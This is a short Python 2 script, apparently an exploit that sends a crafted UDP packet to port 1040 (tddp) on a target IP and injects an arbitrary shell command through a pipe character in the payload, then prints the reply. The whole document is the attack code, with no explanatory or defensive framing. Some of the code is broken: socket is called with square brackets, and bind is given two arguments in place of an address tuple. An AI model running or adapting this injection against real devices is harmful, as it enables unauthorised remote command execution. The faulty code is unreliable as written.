from pwn import *
from socket import *
import sys

tddp_port = 1040
recv_port = 12345

ip = sys.argv[1]
command = sys.argv[2]

s_send = socket[AF_INET,SOCK_DGRAM,0]
s_recv = socket[AF_INET,SOCK_DGRAM,0]

s_recv.bind('',12345)
payload = '\x01\x31'.ljust(12,'\x00')
payload += '123|%s&&echo:123'%(command)

s_send.sendto(payload,(ip,tddp_port))
s_send.close()

res,addr = s_recv.recvfrom(1024)

print res